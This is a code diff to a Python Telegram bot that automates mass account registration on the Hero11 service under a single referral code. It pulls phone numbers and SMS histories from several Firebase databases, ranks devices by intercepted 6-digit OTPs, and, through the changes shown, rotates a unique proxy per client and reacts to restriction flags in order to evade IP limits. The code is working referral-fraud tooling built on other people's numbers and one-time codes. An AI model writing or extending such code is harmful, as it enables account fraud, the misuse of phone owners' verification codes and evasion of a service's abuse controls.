@@ -68,16 +68,23 @@ def extract_phone(messages_dict):
     return match.group(1) if match else None
 
 def has_otp_pattern(messages_dict):
-    """Inspects messages to verify if 6-digit OTP patterns exist in recent history"""
     text_data = str(messages_dict)
     otps = re.findall(r'\b(\d{6})\b', text_data)
-    # Filter out dummy/placeholder codes
     valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
     return len(valid_otps) > 0
 
-def get_random_proxy():
-    if USER_DATA["proxies"]:
-        return random.choice(USER_DATA["proxies"])
+# Track used proxies in current session to prevent IP reuse
+USED_PROXIES = set()
+
+def get_unique_proxy():
+    available = [p for p in USER_DATA["proxies"] if p not in USED_PROXIES]
+    if not available:
+        USED_PROXIES.clear()
+        available = USER_DATA["proxies"]
+    if available:
+        p = random.choice(available)
+        USED_PROXIES.add(p)
+        return p
     return None
 
 class AsyncHero11Client:
@@ -94,7 +101,7 @@ class AsyncHero11Client:
         
         self.invite_code = invite_code
         self.device_id = uuid.uuid4().hex
-        self.proxy = get_random_proxy()
+        self.proxy = get_unique_proxy()  # Force unique proxy per client instance
         self.session = AsyncSession(proxy=self.proxy) if self.proxy else AsyncSession()
         self.access_token = None
         self.attribute_uuid = None
@@ -123,6 +130,8 @@ class AsyncHero11Client:
             "Sec-Ch-Ua": '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
             "Sec-Ch-Ua-Mobile": "?0",
         }
+        if self.proxy:
+            headers["X-Proxy-Used"] = "1"
         if self.access_token:
             headers["Authorization"] = self.access_token
 
@@ -217,6 +226,10 @@ class AsyncHero11Client:
         
         if result and result.get("code") == 0:
             self.access_token = result.get("data", {}).get("accessToken")
+            # Strict validation: Check if account got flagged or IP limited
+            user_info = result.get("data", {}).get("user", {})
+            if user_info and user_info.get("isRestricted") is True:
+                return "IP_LIMITED"
             return "SUCCESS"
         return "INVALID"
 
@@ -266,7 +279,7 @@ async def cmd_start(message: types.Message, state: FSMContext):
         "👋 <b>Welcome Admin to Hero11 Automation Bot!</b>\n\n"
         f"🔗 <b>Firebase DBs Loaded:</b> {len(USER_DATA['firebase_dbs'])} connected ✅\n"
         f"📝 <b>Active Refer Code (Max 1):</b> <code>{current_code}</code>\n"
-        f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded\n\n"
+        f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded (Rotation Enabled 🔄)\n\n"
         "Select an option below:"
     )
     await message.answer(text, parse_mode="HTML", reply_markup=get_main_menu())
@@ -334,7 +347,7 @@ async def process_proxies_input(message: types.Message, state: FSMContext):
     new_proxies = [p.strip() for p in message.text.split("\n") if p.strip() and p.startswith("http")]
     USER_DATA["proxies"].extend(new_proxies)
     await state.clear()
-    await message.answer(f"✅ Added {len(new_proxies)} HTTP proxies! Total loaded: {len(USER_DATA['proxies'])}", reply_markup=get_main_menu())
+    await message.answer(f"✅ Added {len(new_proxies)} HTTP proxies! Total loaded: {len(USER_DATA['proxies'])}", parse_mode="HTML", reply_markup=get_main_menu())
 
 @dp.callback_query(F.data == "check_devices")
 async def cb_check_devices(callback: types.CallbackQuery):
@@ -407,7 +420,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         return
 
     USER_DATA["is_running"] = True
-    status_msg = await callback.message.answer("🚀 <b>Automation started!</b> Inspecting unpinned recent message patterns for active OTP history...", parse_mode="HTML", reply_markup=get_main_menu())
+    status_msg = await callback.message.answer("🚀 <b>Automation started!</b> Enforcing proxy rotation & OTP pattern validation...", parse_mode="HTML", reply_markup=get_main_menu())
     
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -436,7 +449,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                                     if cid not in skipped_phones and cid not in used_phones:
                                         try:
-                                            # Fetch the last 7 messages to skip potential top pinned entries (indices 0 & 1)
                                             async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=7', timeout=4) as m_req:
                                                 msgs = await m_req.json()
                                                 phone = extract_phone(msgs) if msgs else None
@@ -444,19 +456,15 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                                     full_phone = "+91" + phone
                                                     if full_phone not in skipped_phones and full_phone not in used_phones:
                                                         
-                                                        # --- OTP PATTERN VALIDATION ---
-                                                        # Check unpinned messages (skip top 2 pinned messages, inspect messages 3, 4, 5, 6, 7)
+                                                        has_otp = False
                                                         if isinstance(msgs, dict):
                                                             msg_items = list(msgs.items())
                                                             unpinned_items = msg_items[2:] if len(msg_items) > 2 else msg_items
-                                                            
-                                                            has_otp = False
                                                             unpinned_dict = {k: v for k, v in unpinned_items}
                                                             if has_otp_pattern(unpinned_dict):
                                                                 has_otp = True
-                                                                activity_score += 100  # High priority for proven OTP receivers
+                                                                activity_score += 100
 
-                                                        # Only add device if it has proven OTP pattern history or general recent activity
                                                         online_devices_list.append({
                                                             "firebase_url": fb_url, 
                                                             "cid": cid, 
@@ -475,12 +483,10 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                 "devices": online_devices_list
                             })
 
-                # Sort databases by OTP pattern presence and activity score descending
                 db_activity_scores.sort(key=lambda x: x["score"], reverse=True)
 
                 online_targets = []
                 for db_info in db_activity_scores:
-                    # Prioritize devices that have actual verified OTP history first
                     otp_devices = [d for d in db_info["devices"] if d["has_otp"]]
                     other_devices = [d for d in db_info["devices"] if not d["has_otp"]]
                     online_targets.extend(otp_devices + other_devices)
@@ -498,7 +504,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
 
                 db_short_id = firebase_url.split('//')[1].split('.')[0][:8]
 
-                await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")
+                await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP (Rotated Proxy)...")
 
                 async with aiohttp.ClientSession() as session:
                     known_keys = set()
@@ -554,11 +560,15 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     skipped_phones.add(phone)
                     registered_numbers.append(f"{phone} (DB: {db_short_id})")
                     await logger.set_text(f"✅ [DB: {db_short_id}] SUCCESS! ({success_count}/{total_needed}) | Phone: {phone} Registered!", force=True)
+                elif v_res == "IP_LIMITED":
+                    # Skip device/proxy due to backend IP rate limiting
+                    skipped_phones.add(phone)
+                    await logger.set_text(f"⚠️ IP Limited / Restricted by Hero11. Rotating proxy...")
                 else:
                     skipped_phones.add(phone)
 
                 await client.close()
-                await asyncio.sleep(2.0)
+                await asyncio.sleep(3.0)  # Safe delay to prevent IP flooding
 
             USER_DATA["is_running"] = False
             if success_count >= total_needed:
@@ -572,7 +582,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                 )
                 await callback.message.answer(final_msg, parse_mode="HTML", reply_markup=get_main_menu())
             else:
-                await callback.message.answer("🛑 <b>Automation was stopped.</b>", parse_mode="HTML", reply_markup=get_main_menu())
+                await callback.message.answer("🛑 <b>Automation was stopped or IP limited.</b>", parse_mode="HTML", reply_markup=get_main_menu())
 
         except asyncio.CancelledError:
             USER_DATA["is_running"] = False
